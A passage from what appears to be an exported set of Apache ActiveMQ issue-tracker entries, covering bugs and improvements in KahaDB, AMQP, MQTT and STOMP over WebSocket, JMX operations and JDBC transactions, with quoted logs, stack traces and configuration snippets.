javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1408)        at javax.management.remote.rmi.RMIConnectionImpl.access$100(RMIConnectionImpl.java:81)        at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1245)        at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1341)        at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImpl.java:782)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:294)        at sun.rmi.transport.Transport$1.run(Transport.java:153)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:149)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:460)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:701)        at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-6651
type:Improvement
changed files:DataByteArrayOutputStream.java
MarshallingSupport.java
DataByteArrayInputStream.java
texts:Add new implementations of the writeUTF8 and readUTF8 methods
Provide implementation based on Apache Harmony code and remove some code duplications
issueID:AMQ-6652
type:Bug
changed files:
texts:KahaDB checkpoint index page flush skips metadata page
Disk image of the metadata is one checkpoint behind. This can surface on restart after a kill -9 with the ackMessageFileMap referencing a deleted file in error. Exception on start: java.io.IOException: Detected missing journal files.
issueID:AMQ-6659
type:Improvement
changed files:
texts:AMQP: Match client SenderSettleMode instead of always defaulting to MIXED
On link attach we currently default out SenderSettleMode to MIXED which while legal doesn"t truly reflect what the client asked for.  We should instead update the link to reflect the mode requested by the clientAlso add some tests to ensure that we always return the ReceiverSettleMode as FIRST since we don"t support SECOND.
issueID:AMQ-666
type:New Feature
changed files:
texts:enable RESTful browsing of message queues using a web connector - either as message IDs or as XML or as RSS/Atom
None
issueID:AMQ-6661
type:Bug
changed files:
texts:Auto transport with MQTT will fail for a long password
The issue is that there is a variable length header as part of the CONNECT packet.  The remaining length portion can be up to 4 bytes and that isn"t being taken in to account.
issueID:AMQ-6664
type:Bug
changed files:
texts:XMLs in ActiveMQ admin panel are not generated properly
Start ActiveMQ 5.14.5 and go to http://127.0.0.1:8161/admin/xml/queues.jspInstead of<queues></queues>you get raw template:<queues><c:forEach items="[]" var="row"><queue name="<c:out value="" />">  <stats size=""         consumerCount=""         enqueueCount=""         dequeueCount=""/>  <feed>    <atom><c:out value="queueBrowse/?view=rss&amp;feedType=atom_1.0"/></atom>    <rss><c:out value="queueBrowse/?view=rss&amp;feedType=rss_2.0"/></rss>  </feed></queue></c:forEach></queues>This worked fine in AcitveMQ 5.14.4 and earlier.
issueID:AMQ-6665
type:Bug
changed files:
texts:certificate-based authentication on network bridge fails for nio+ssl protocol
client certificate authentication works in the following scenario:Broker A    ...    <jaasDualAuthenticationPlugin         configuration="activemq"        sslConfiguration="CertLogin" />    ...    <transportConnector name="sslTransportConnector" uri="ssl://0.0.0.0:61618?needClientAuth=true&amp;wantClientAuth=true"/>Broker B    ...    networkConnector uri="static://(ssl://localhost:61618)" name="myNetworkConnector" duplex="true" consumerTTL="2" messageTTL="100" dynamicOnly="false">    ...But if you change the transport to nio+ssl, the network connector fails with the following message:INFO | Stopping vm://localhosta#0 because Failed with SecurityException: User name [null] or password is invalid.
issueID:AMQ-6667
type:Bug
changed files:
texts:Many instances of "duplicate message ... from cursor" redirecting to dlq
In a high throughput scenario on a single destination there can be many warnings of this kind:[2017-03-21 09:51:37,548] WARN ActiveMQ BrokerService[localhost] Task-5 Queue - queue://TEST, subscriptions=10, memory=102%, size=399, pending=0, duplicate message ActiveMQTextMessage {commandId = 72, responseRequired = true, messageId = ID:Mac.fritz.box-64479-1490086286066-183:1:1:1:68, originalDestination = null, originalTransactionId = null, producerId = ID:Mac.fritz.box-64479-1490086286066-183:1:1:1, destination = queue://TEST, transactionId = null, expiration = 0, timestamp = 1490086297427, arrival = 0, brokerInTime = 1490086297427, brokerOutTime = 1490086297427, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@8672edc, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 50216, properties = null, readOnlyProperties = false, readOnlyBody = false, droppable = false, jmsXGroupFirstForConsumer = false, text = ...XXXXXXXXXXXX} from cursor, is cursor audit disabled or too constrained? Redirecting to dlqThe broker loads messages twice into the cursor.
issueID:AMQ-6669
type:Bug
changed files:
texts:AMQP: WS connections don&#39;t respect maxFrameSize value on transportConnection
For AMQP WebSocket connections the maxFrameSize setting on the ws Transport doesn"t modify the sockets maxBinaryMessageSize option to allow packets larger than 65535 through leading to a dropped connection.
issueID:AMQ-6670
type:Bug
changed files:
texts:KahaDB - Inconsistent error handling on corrupt journal reads
When the journal is corrupt, for example if it is overwritten with null or zero. The result of reading from corrupt locations is inconsistent. Errors occur but not all result in a trip to the IOExceptionHander where the option to stop the broker is available.ClassCastExceptions and RuntimeExceptions can bubble up to the cursors in error.ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | ActiveMQ BrokerService[XXXXX] Task-300java.lang.RuntimeException: java.lang.RuntimeException: java.lang.ClassCastException: org.apache.activemq.store.kahadb.data.KahaTraceCommand cannot be cast to org.apache.activemq.store.kahadb.data.KahaAddMessageCommand at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:145)or ERROR | Failed to load message at: 1084:12816246 | org.apache.activemq.store.kahadb.KahaDBStore | ActiveMQ BrokerService[XXXX] Task-702org.apache.activemq.protobuf.InvalidProtocolBufferException: Protocol message contained an invalid tag (zero). at org.apache.activemq.protobuf.InvalidProtocolBufferException.invalidTag(InvalidProtocolBufferException.java:48) at org.apache.activemq.protobuf.CodedInputStream.readTag(CodedInputStream.java:75)
issueID:AMQ-6672
type:Improvement
changed files:
texts:Use a dynamic proxy in place of hand crafted read only objects for AMQP test client
Currently the AMQP test client uses hand crafted read-only wrappers around certain Proton objects returned from the client code to prevent a test from accidentally changing proton state outside the connection object"s handler thread.  This is a bit cumbersome as these classes tend to need minor tweaks each time the proton library is updated.  We can instead use a proxy for the proton types generated on the fly to protect most of the proton code from being modified and not need to make changes on each version update.
issueID:AMQ-6673
type:Improvement
changed files:NettyTransportOptions.java
NettyWSTransport.java
NettyTcpTransport.java
texts:Add some fixes and improvements to the AMQP test client transport
Port some fixes over from Qpid JMS to the Netty based transport used in the AMQP test client.  Adds some thread safely fixes and some Netty usage fixes as well as adding a tracing option that will insert a logging handler from Netty to trace bytes sent / received in the tests.
issueID:AMQ-6674
type:Improvement
changed files:AmqpConnection.java
texts:Ensure timely shutdown of AMQP test client executor on connection close
Ensure that on close of the connection in the AMQP test client that the scheduled idle and timeout tasks don"t force the shutdown to wait.
issueID:AMQ-6675
type:Test
changed files:
texts:AMQP Test client doesn&#39;t configure its netty WS handler with the AMQP frame size
The AMQP test client"s WS transport should be configured with the AMQP max frame size given to it"s proton connection otherwise the broker can send it a larger frame than it"s Netty WS handshaker will accept leading to dropped connections due to max incoming frame size violations.
issueID:AMQ-6676
type:Test
changed files:NettyWSTransport.java
texts:Handle WebSocket continuation frames on AMQP test client
The WebSocket Transport in the test client isn"t handling continuation frames which can lead to dropping data and failing to handle complete AMQP frames.
issueID:AMQ-6678
type:Bug
changed files:
texts:Move/Retry (destructive) Queue JMX operations need synchronization
concurrent calls to move selector matching messages from one queue to another or any wildcard type destructive JMX operation can break on concurrent invocation.The move results in duplicates in the journal (waste of space) and incorrect return counts due to inflight messages being visible in error.Two jmx consoles is enough to cause problems.
issueID:AMQ-668
type:Bug
changed files:
texts:Build is broken - missing the rome_version and the jdom_version
+---------------------------------------- Executing clean ActiveMQ :: Web Memory: 6M/9M+----------------------------------------DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xmlDEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xmlbuild:end:Attempting to download rome-.jar.WARNING: Failed to download rome-.jar.Attempting to download jdom-.jar.WARNING: Failed to download jdom-.jar.BUILD FAILEDFile...... /Users/bsnyder/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jellyElement... maven:reactorLine...... 218Column.... -1The build cannot continue because of the following unsatisfied dependencies:rome-.jarjdom-.jarTotal time   : 1 minutes 21 seconds Finished at  : Tuesday, March 28, 2006 1:51:36 PM MST
issueID:AMQ-6680
type:Bug
changed files:
texts:MQTT over WebSocket doesn&#39;t work when WebSocket data frame contains partial or multiple MQTT control packets
I tried to use the MQTT.js library in a browser but it didn"t connect to ActiveMQ using MQTT-WebSocket transport.Debugging MQTT.js and ActiveMQ I found that the org.apache.activemq.transport.ws.jetty9.MQTTSocket class (in activemq-http module) assumes that a single WebSocket data frame always contains a single MQTT Control Packet.This is the cause of MQTT.js failure because MQTT.js makes several send over WebSocket for a single MQTT Control Packet (header, length etc).Accordingly to MQTT OASIS specification ( http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718127 ):A single WebSocket data frame can contain multiple or partial MQTT Control Packets. The receiver MUST NOT assume that MQTT Control Packets are aligned on WebSocket frame boundaries.And RFC 6455 ( https://www.ietf.org/rfc/rfc6455.txt ): The WebSocket message does not necessarily correspond to a particular network layer framing, as a fragmented message may be coalesced or split by an intermediary.So I think that ActiveMQ should be fixed to be compliant to the WebSocket and MQTT specifications.I attached the diff patch file for MQTTSocket which fixes the problem and a new activemq-http module MQTT-WebSocket unit test for this issue (the same of MQTTWSTransportTest but which splits MQTT Frame Packet in multiple WebSocket frames):MQTTWSPartialFrameConnection.javaMQTTWSPartialFrameTest.javaWhen writing the unit test I found also a bug in the class org.apache.activemq.transport.ws.MQTTWSConnection.java. All the occurrences of: ByteSequence payload = wireFormat.marshal(command.encode());connection.getRemote().sendBytes(ByteBuffer.wrap(payload.data));should be replaced with:ByteSequence payload = wireFormat.marshal(command.encode());connection.getRemote().sendBytes(ByteBuffer.wrap(payload.data, payload.offset, payload.length));That is because of the payload.data bytes array buffer in ByteSequenze is bigger than the real MQTT frame packed bytes size, so sending all the payload.data bytes array, ActiveMQ receives much more extra zero-extra bytes. With the current implementation, those extra zero-bytes are ignored and this makes wrongly passes the test (while it should fail because there are "extra bytes" which doesn"t respect the MQTT protocol).I attached also the diff patch file for the MQTTWSConnection file.
issueID:AMQ-6681
type:Improvement
changed files:
texts:Update aries-blueprint-core version in activemq-karaf POM
Currently the version is     <dependency>      <groupId>org.apache.aries.blueprint</groupId>      <artifactId>org.apache.aries.blueprint.core</artifactId>      <version>1.4.4</version>    </dependency>It should be at least 1.7.1 (in line with Karaf 3.0.x).
issueID:AMQ-6684
type:Bug
changed files:
texts:org.json is cat-x - needs to be removed
org.json is cat-x and cannot be included as a compile dependency going forward.org.linkedin:org.linkedin.zookeeper-impl:jar:1.4.0:compile&#91;INFO&#93; |  &#45; org.linkedin:org.linkedin.util-groovy:jar:1.7.1:compile&#91;INFO&#93; |     +- org.slf4j:jul-to-slf4j:jar:1.5.8:compile&#91;INFO&#93; |     +- org.apache.ant:ant:jar:1.8.4:compile&#91;INFO&#93; |     |  &#45; org.apache.ant:ant-launcher:jar:1.8.4:compile&#91;INFO&#93; |     &#45; org.json:json:jar:20090211:compileis used in activemq-leveldb-store and activemq-partitionusing curator as a replacement may be a viable option for the zk client dependency.
issueID:AMQ-6687
type:Bug
changed files:
texts:destination memory usage incorrect after flow control (PFC) sendTimeout and rollback
When using PFC, to block a producer on a memory limit and using a sendTimeout to error out after some timeout. If there is a send transaction the send completes in error even though the transaction has completed once usage allows.Leaving a dangling send that shows up in the memory usage.
issueID:AMQ-6688
type:Bug
changed files:
texts:org.apache.activemq.broker.region.Queue.doMessageSend() future not completing
A case of a send thread blocked on the send future.get()...ActiveMQ VMTransport: vm://XXXXXX" #375 daemon prio=5 os_prio=0 tid=0x00007f9bdc2f0800 nid=0x4e2 waiting on condition [0x00007f9bc7e9e000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000000d8e65ef8> (a org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask$InnerFutureTask) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.FutureTask.awaitDone(FutureTask.java:429) at java.util.concurrent.FutureTask.get(FutureTask.java:191) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:853) at org.apache.activemq.broker.region.Queue.send(Queue.java:727) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:419) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:468) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:296) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:293) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.util.LoggingBrokerPlugin.send(LoggingBrokerPlugin.java:275) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:571) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:326) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:190) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:271) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745)It seems that the org.apache.activemq.store.kahadb.KahaDBStore.StoreQueueTask#run()  which should invoke complete on the future has been invoked but complete is not triggered. This can happen in the event that the add results in a Throwable!
issueID:AMQ-6689
type:Task
changed files:
texts:New logo for ActiveMQ
The ActiveMQ logo hasn"t changed in a while.It would be nice to have a new looking and feel logo, including an abstract image.There will be a blog post linking to this issue, that will have more information about the logo submissions...
issueID:AMQ-669
type:Improvement
changed files:BrokerService.java
texts:Add a keepDurableSubsActive option to brokers so that durable subs eagerly loaded and kept in memory
Problem is described at:https://issues.apache.org/activemq/browse/AMQ-493One way to solve this is to avoid getting to the big backlog of messages.  The there are not too many messages to recover, then AMQ-493 is not an issue.  Add a keepDurableSubsActive option to the broker would be a workaround to this issue.  The down side is that the broker would eventually block if the durable consumer is offline for too long.
issueID:AMQ-6690
type:Improvement
changed files:
texts:Protect against JMX move/copy operations onto self
The move and copy jmx operations are intended to move/copy messages to another destination. However this is not enforce and if the move/copy destination is the same queue the logs fill with duplicate warnings etc and the stats can get out of sync if the operation is repeated or concurrent.Best to cut this off at the pass with a return return code indicating nothing was moved/copied.
issueID:AMQ-6691
type:Improvement
changed files:
texts:JMX - allow DLQ flag to be modified
AMQ-4483 introduces the destination flag but it is not persisted in the message store and does not survive a restart.Adding the flag to the destinations element in the broker xml works around this however it assumes prior knowledge.Allowing the flag to be set allows a retrospective change pending the next restart when a modification to the destinations element can be picked up.
issueID:AMQ-6693
type:Bug
changed files:
texts:SQLException when concurrently moving messages to DLQ
with the jdbc message store and the absence of a security context moving messages to the dlq on transaction rollback and exhausted redelivery is completed using the broker context.However the long term connection associated with a jdbc context is not thread safe. It is typically associated with an incoming connection which is.If multiple consumers poison ack concurrently the broker can step over itself using this shared context.The long term connection context should be ignored for the broker.
issueID:AMQ-6694
type:Bug
changed files:ActiveMQComponent.java
texts:Not possible to autowire connectionFactory in Spring Boot using SB starter
From version 5.14.1 it is not possible to autowire the ConnectionFactory on the activemq component due to the change introduced in this commithttps://github.com/apache/activemq/commit/4437393aa1a981a182142c255f76ae7cc50af183#diff-474de9fc51b7273d42a39c6327492388 Im not really able to create a PR since I"m aware of the reasoning behind that camel activemq should not be allowed to autowire the sb connectionfactory whereas the camel jms component is  https://github.com/apache/camel/blob/master/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsComponent.java#L184Currently the SB autowirering as described here https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-messaging.html#boot-features-activemq seems broken.The quickfix would be to allow autowirering again, but I wonder if there are other considerations that has to be taken into account.See also discussion here http://camel.465427.n5.nabble.com/spring-activemq-broker-url-not-set-correct-on-Activemq-Spring-Boot-td5799927.html
issueID:AMQ-6696
type:Bug
changed files:
texts:Memory Usage for composite destination increasing when concurrentSend is used
After message has been forwarded to the underlying queues MemoryUsageByteCount is increasing for the topic, would have expected it to return to zero.<destinationInterceptors>    <virtualDestinationInterceptor>      <virtualDestinations>    <compositeTopic name="target" forwardOnly="false" concurrentSend="true" >             <forwardTo>                <queue physicalName="queue.one" />                <queue physicalName="queue.two" />                <queue physicalName="queue.three" />         </forwardTo>  </compositeTopic>           </virtualDestinations>     </virtualDestinationInterceptor></destinationInterceptors>
issueID:AMQ-6697
type:Bug
changed files:
texts:Aborting a STOMP 1.1 transaction after ACK/NACK leads to invalid state
Reproducing the problem: Receive a message via STOMP (EDIT: on a subscription with ack:client-individual) Start a transaction ACK (or NACK) the message within the transaction Abort the transaction ACK (or NACK) the messageExpected behaviour: The message is according to step #5 either ACKed or NACKed.Observed behaviour: The message is neither ACKed nor NACKed, but stays in unacknowledged state An exception is raised: org.apache.activemq.transport.stomp.ProtocolException: Unexpected ACK received for message-id &#91;ID:(...)&#93;        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompAck(ProtocolConverter.java:475)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:250)        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)        at java.lang.Thread.run(Thread.java:745) an ERROR message is sent to the clientAs far as I can tell this is caused by code in both onStompAck() and onStompNack():https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=blob;f=activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java;h=b25860bf6895240c33a8643b6fcc731af126d32e;hb=refs/heads/master#l440With a STOMP 1.1 ACK/NACK, ackId == null, so the message entry is taken out of this.pedingAcks (sic!).When the transaction is aborted the message entry is then not put back into this.pedingAcks, so any subsequent ACK/NACK will find pendingAck==null, therefore acked==false, raising an exception.
issueID:AMQ-6698
type:Bug
changed files:
texts:auto+nio+ssl protocolDetectionTimeout does not work if SSL handshake is not finished
The protocolDetectionTimeout value is supposed to define how long a connection attempt has to detect the protocol type before failing.  However there is a small issue where the initial SSL handshake is being done outside of the async task that times out.  This means that if the SSL handshake isn"t finished because the client never sends enough bytes (such as if a client opens a normal TCP socket) then the socket will just hang open and not be closed.  The handshake should be moved inside of the task that times out to fix this.Also, I"m going to change the default protocolDetectionTimeout to 30 seconds instead of 15 seconds as 30 is the default for the TcpTransport connectionTimeout value and also the default for the InactivityMonitor.
issueID:AMQ-6699
type:Bug
changed files:
texts:STOMP headers are not escaped when using WebSocket
When using STOMP over WebSockets, STOMP header values are not escaped in frames sent by ActiveMQ.When the following frame is sent:SENDdestination:/queue/testescaped-header:one
twocthreeHello WorldActiveMQ interprets escaped headers correctly, but does not escape them when sending own frames:MESSAGEexpires:0destination:/queue/testsubscription:12345priority:4escaped-header:onetwo:threemessage-id:ID:-50091-1497003246573-3:1:-1:1:1timestamp:1497003247783Hello WorldCorrectly escaped frame should look like this:MESSAGEexpires:0destination:/queue/testsubscription:12345priority:4escaped-header:one
twocthreemessage-id:IDc-50091-1497003246573-3c1c-1c1c1timestamp:1497003247783Hello World
issueID:AMQ-6700
type:Bug
changed files:
texts:Leak of "ActiveMQ Connection Executor" threads and ActiveMQConnection objects in JCA
The ActiveMQ JCA layer may leak threads of name "ActiveMQ Connection Executor" and instances of org.apache.activemq.ActiveMQConnection when there are problems with establishing the connection. If the initial openwire connection cannot be established, it may run an "ActiveMQ Connection Executor" thread to deal with the error leading to a code path that does not close the connection and does not clear up the "ActiveMQ Connection Executor" thread.Low level details in further comments.This problem can be reproduced by running ActiveMQResourceAdapter.TransactionContext.recover() but potentially other code paths in the resource adapter are effected as well.
issueID:AMQ-6702
type:Improvement
changed files:
texts:Allow dead letter strategy audit configuration
When the default shared dead letter strategy is used with composite queues or durable subs or virtual topics and messages expire - the dlq gets lots of requests to store duplicates. The audit on the strategy traps most of these duplicate add attempts but that audit is not configurable so it is possible the some get through which may be trapped by the message store or cursor on subsequent dispatch.Allowing the audit to be configured past the default parameters allows duplicates to be stopped at source.
issueID:AMQ-6703
type:Bug
changed files:Queue.java
texts:JMX purge needs to clear the message audit
JMX purge clears a queue of messages but does not reset the message audit. Doing a X.copyTo(Y), X.purge() Y.copyYo(X) results in duplicate detection and messages going to the DLQ in error.JMX purge needs to clear the message audit such that the queue is free of old state.
issueID:AMQ-6704
type:Improvement
changed files:
texts:Dependency updates for version 5.15.0
We should go through our dependencies and update any that make sense in time for teh 5.15.0 release.
issueID:AMQ-6706
type:Improvement
changed files:
texts:Allow for hooks before broker stop occurs
When Camel is run embedded within ActiveMQ it"s shutdown is called at the point the broker is already stopped, this can lead to data loss as there could be exchanges that have not ended.I propose a preStopHook(s) that can be invoked during ActiveMQ shutdown but before the broker is shutdown.This would allow Camel to gracefully shutdown while the broker is still started.
issueID:AMQ-6707
type:Bug
changed files:AbstractPendingMessageCursor.java
AbstractStoreCursor.java
texts:JDBC XA: Could not remove prepared transaction state from message
When ActiveMQ 5.14.5 is configured with jdbc persistence storage (postgres) from time to time below error occurs:2017-06-15 01:41:37,418 | ERROR | enerContainer-21 | CommitTask                       | 67 - org.apache.aries.transaction.manager - 1.3.1 | Unexpected exception committing org.apache.geronimo.transaction.manager.WrapperNamedXAResource@34ac9d62; continuing to commit other RMsjavax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back xaErrorCode:104 at org.apache.activemq.TransactionContext.toXAException(TransactionContext.java:793) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:622) at org.apache.geronimo.transaction.manager.WrapperNamedXAResource.commit(WrapperNamedXAResource.java:54) at org.apache.geronimo.transaction.manager.CommitTask.run(CommitTask.java:64) at org.apache.geronimo.transaction.manager.TransactionImpl.commitResources(TransactionImpl.java:688) at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:327) at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:252) at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1020) at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:761) at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:730) at org.apache.aries.transaction.internal.AriesPlatformTransactionManager.commit(AriesPlatformTransactionManager.java:75) at sun.reflect.GeneratedMethodAccessor180.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)[:1.8.0_131] at java.lang.reflect.Method.invoke(Method.java:498)[:1.8.0_131] at com.ectsp.spring.osgi.PlatformTransactionManagerFactoryBean$ProxyTxManagerHandler.invoke(PlatformTransactionManagerFactoryBean.java:115)[169:ectsp-spring-osgi:1.0.0.SNAPSHOT] at com.sun.proxy.$Proxy68.commit(Unknown Source)[100:org.apache.servicemix.bundles.spring-tx:4.2.8.RELEASE_1] at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:245)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1164)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1156)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:1053)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1] at java.lang.Thread.run(Thread.java:748)[:1.8.0_131]Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back xaErrorCode:104 at org.apache.activemq.transaction.Transaction.newXAException(Transaction.java:212) at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:93) at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:76) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:118) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:118) at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:547) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:336) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:200) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)[47:org.apache.activemq.activemq-osgi:5.14.5] at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)[47:org.apache.activemq.activemq-osgi:5.14.5] at java.lang.Thread.run(Thread.java:745)[:1.8.0_131]Caused by: java.io.IOException: Could not remove prepared transaction state from message add for sequenceId: 4025171 at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doCommitAddOp(DefaultJDBCAdapter.java:1031) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitAdd(JDBCPersistenceAdapter.java:780) at org.apache.activemq.store.jdbc.JdbcMemoryTransactionStore$CommitAddOutcome.run(JdbcMemoryTransactionStore.java:146) at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:101) at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:270) at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:86) ... 15 moreIt seams that it the same issue as in https://issues.apache.org/jira/browse/AMQ-5567.
issueID:AMQ-672
type:New Feature
changed files:NetworkConnector.java
DemandForwardingBridgeSupport.java
texts:JAAS and clustering support
Added JAAS for clustering with AMQ.
issueID:AMQ-673
type:New Feature
changed files:
texts:A way to Pool embedded brokers so that if multiple spring contexts are being used which define an embedded broker, only the first one starts up the broker.
A good use case would be where you want to use a single embedded broker across multiple webapps.  Only the first web app should start the embedded broker.
issueID:AMQ-676
type:Bug
changed files:
texts:KahaXARecoveryTest fails
KahaXARecoveryTest fails - fix persistence for XA transactions
issueID:AMQ-6764
type:Improvement
changed files:
texts:Add ended statement to Audit log for JMX ops
AMQ-3100 introduced an audit log. It is boolean enabled or disabled.This enhancement allows four values for the system property: "org.apache.activemq.audit"true|entry,exit,all true|entry: log each called op (existing behaviour) exit: log the ending of each called op all: - log both the entry and exit (called and ended) log statements
issueID:AMQ-6765
type:Bug
changed files:HttpClientTransport.java
texts:HttpClientTransport loses exception information
In the exception handling in the doStart() method of the HttpClientTransport vital debugging information is lost.On line 282, for any encountered exception an IOException is thrown with the following message: ""Failed to perform GET on: " + remoteUrl + " as response was: " + e.getMessage()". Where e.getMessage() usually returns null.It would be nicer if at least he http status code was logged, and maybe the stacktrace when trace is enabled.
issueID:AMQ-677
type:Bug
changed files:AdvisoryBroker.java
texts:ActiveMQ broker leaks advisory topics
When I run the attached code, which AFAIK is completely legal JMS, the ActiveMQ broker grows to 500+ mb and crashes due to being out of heap space.  Some investigation with hprof has lead me to believe that the advisory topics created by the MessageConsumers (and Producers, but I use the same producer each time so that"s not causing a problem) are being put into a DestinationMap and not being removed.The rough origin of this is in the addProducer call in AdvisoryBroker, which creates the advisory topic.Note that this memory is not freed when the DestinationInfo removing the original temptopic is received, nor when the actual client exits.  The object lifetime of these advisory destinations seems very poorly defined.  If they are implicitly created by the server, they should be implicitly destroyed by the same.To reproduce, I"ve been running this code with -Dtopic=true and -Dmax=10000 (though the problem shows up well before this amount).  This is just a modified version of the example ProducerTool (note it doesn"t actually send any messages).Please verify the correctness of the attached code.Andrew Lusk
issueID:AMQ-6771
type:Improvement
changed files:
texts:Improve performance of KahaDB recovery check checkForCorruptJournalFiles=true
